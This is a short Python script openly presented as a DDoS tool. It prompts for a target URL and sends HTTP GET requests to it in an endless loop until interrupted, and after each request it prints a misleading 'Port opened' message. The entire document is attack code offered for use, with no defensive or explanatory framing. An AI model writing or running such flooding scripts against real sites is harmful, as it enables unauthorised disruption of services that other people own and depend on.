import requests
import time
import random
url = input ("What URL would you like to DDOS? >>> ")
print ("Loading, wait a second.....Press ctrl + c to stop")  
while True:
  try:
    requests.get(url)
  
    print ("Port opened>")
  except KeyboardInterrupt:
    print ("Exiting...")
    break


